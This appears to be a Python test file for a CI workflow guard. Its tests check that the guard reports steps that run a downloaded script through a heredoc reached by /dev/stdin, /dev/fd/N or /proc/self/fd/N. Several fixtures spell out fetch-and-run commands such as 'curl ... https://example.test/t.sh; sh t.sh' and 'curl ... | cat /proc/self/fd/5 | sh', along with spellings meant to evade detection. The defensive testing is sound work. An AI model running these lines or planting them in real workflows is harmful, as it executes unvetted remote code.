"""#2972: a heredoc reached through its descriptor path is read as the program.

`. /dev/stdin <<'EOF'`, `source /dev/stdin <<'EOF'` and `sh /dev/fd/3 3<<'EOF'` ran the body under every parent (source:
bash) and read CLEAN: a shell's stdin operand (`-`, `/dev/stdin`, `/dev/fd/0`) was read as its program, but `.`'s and
`source`'s FILE operand was read as a file, and a body on a descriptor other than 0 was exposed by no field of the stage.
`shell_reader` now keeps each descriptor's final body on the stage (`fd_bodies`) and resolves `/proc/self/fd/N` and
`/proc/thread-self/fd/N` to N; `workflow_written.bind_written` binds a FILE operand whose descriptor path names such a
descriptor to that body, which `stdin_scripts` reads as it reads a `<(…)` FILE.

Marks are a letter a `shell:` setting -- unset, `bash`, `sh`, `bash {0}`, `sh {0}` -- R where the guard reports, C where
it reads the step CLEAN: first the job's, then the main pass's. Truth: the #2939 round-2 seat's kit (eight parents, two
child pairings), and the forge's Linux bash and dash for the `/proc` spellings (macOS has no `/proc`).
"""
import unittest

import shell_reader
import workflow_guard as wg
import workflow_options as wo

SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
BODY = "curl -fsSLo t.sh https://example.test/t.sh; sh t.sh"
UNION = "curl -fsSLo t.sh https://example.test/t.sh; ${Y:+/usr/bin/env true} sh t.sh"
REPORTED = ("RRRRR", "RRRRR")
CLEAN = ("CCCCC", "CCCCC")


def marks(text):
    """(the job's marks, the main pass's) for a job of one step whose `run:` is `text`."""
    job = mains = ""
    for shell in SHELLS:
        step = [wg.Step("step", text + "echo done\n", shell)]
        job += "R" if wg.job_defects(step) else "C"
        with wo.mains_answer():
            mains += "R" if wg._job_defects(step) else "C"
    return job, mains


class TestADescriptorPathNamesTheHeredoc(unittest.TestCase):

    def test_the_kits_rows_report(self):
        # P.I.dotstdin, P.I.srcstdin, P.I.fd3file, plain and `.union`: CLEAN on `main`; truth: runs (source: bash).
        for head in (". /dev/stdin", "source /dev/stdin", "sh /dev/fd/3 3"):
            for body in (BODY, UNION):
                text = "%s<<'EOF'\n%s\nEOF\n" % (head + ("" if head.endswith("3") else " "), body)
                with self.subTest(text=text[:30], body=body[-14:]):
                    self.assertEqual(REPORTED, marks(text))

    def test_the_spellings_of_this_processs_own_descriptor(self):
        # `/proc/self/fd/N` and `/proc/thread-self/fd/N` name this process's own descriptor N on Linux: runs under bash
        # and dash on the forge. Any other `/proc/*/fd/` path stays unresolved.
        for path in ("/proc/self/fd/0", "/proc/thread-self/fd/0"):
            with self.subTest(path=path):
                self.assertEqual(REPORTED, marks(". %s <<'EOF'\n%s\nEOF\n" % (path, BODY)))
        self.assertEqual("0", shell_reader.input_alias_fd("/proc/self/fd/0"))
        self.assertEqual("3", shell_reader.input_alias_fd("/proc/thread-self/fd/03"))
        self.assertEqual("?", shell_reader.input_alias_fd("/proc/1/fd/0"))

    def test_an_expanding_body_is_reported_unspelled(self):
        # `. /dev/stdin <<EOF` with `$T` in the body: the shell expands it first, so the text is not spelled here --
        # reported, fail-closed; with nothing to expand the body is read as written.
        self.assertEqual(REPORTED, marks("T=x\n. /dev/stdin <<EOF\n%s $T\nEOF\n" % BODY))
        self.assertEqual(REPORTED, marks(". /dev/stdin <<EOF\n%s\nEOF\n" % BODY))


class TestWhatReadsAsItDid(unittest.TestCase):

    def test_the_controls(self):
        # `sh <&3 3<<'EOF'` and `sh < /dev/fd/3 3<<'EOF'`: the redirection opens before `3<<` exists, nothing runs;
        # `sh /dev/fd/4 3<<'EOF'`: no body on 4, nothing runs. CLEAN on `main` and here.
        for text in ("sh <&3 3<<'EOF'\n%s\nEOF\n", "sh < /dev/fd/3 3<<'EOF'\n%s\nEOF\n", "sh /dev/fd/4 3<<'EOF'\n%s\nEOF\n"):
            with self.subTest(text=text[:22]):
                self.assertEqual(CLEAN, marks(text % BODY))

    def test_a_descriptor_path_a_printer_reads_is_the_descriptor_it_names(self):
        # The review seat's condition: `/proc/self/fd/N` now reads as `/dev/fd/N` does. With fd 5 open on the
        # download (`5<&0`) `cat` prints it into `sh`: reported, both spellings (truth: runs, Linux bash and dash).
        # With fd 5 not open `cat` prints nothing and nothing runs: CLEAN, as `main` reads the `/dev/fd/5` twin --
        # the one REPORT -> CLEAN this PR makes, accepted by the seat as the designed equivalence.
        stream = "curl -fsSL https://example.test/i.sh | cat %s%s | sh\n"
        for path in ("/proc/self/fd/5", "/dev/fd/5"):
            with self.subTest(path=path):
                self.assertEqual(REPORTED, marks(stream % (path, " 5<&0")))
                self.assertEqual(CLEAN, marks(stream % (path, "")))

    def test_what_main_reported(self):
        # A shell's own stdin operand, and the here-string spellings the issue asked to measure: reported on `main`.
        for text in ("sh /dev/stdin <<'EOF'\n%s\nEOF\n" % BODY, "bash /dev/fd/0 <<'EOF'\n%s\nEOF\n" % BODY,
                     "source /dev/stdin <<< \"$(curl -fsSL https://example.test/i.sh)\"\n",
                     ". /dev/stdin <<< \"$(curl -fsSL https://example.test/i.sh)\"\n"):
            with self.subTest(text=text[:24]):
                self.assertEqual(REPORTED, marks(text))


class TestTheReader(unittest.TestCase):

    def test_each_descriptors_final_body_is_on_the_stage(self):
        # Every descriptor's but 0's, which `stdin_heredoc` holds (and which alone differs across the folds).
        stage = shell_reader.statements("sh /dev/fd/3 3<<'EOF' <<'END'\na\nEOF\nb\nEND\n")[0].stages[0]
        self.assertEqual((("3", "a", False),), stage.fd_bodies)
        self.assertEqual(("b", False), stage.stdin_heredoc)
        self.assertEqual((), shell_reader.statements("sh t\n")[0].stages[0].fd_bodies)


if __name__ == "__main__":
    unittest.main()
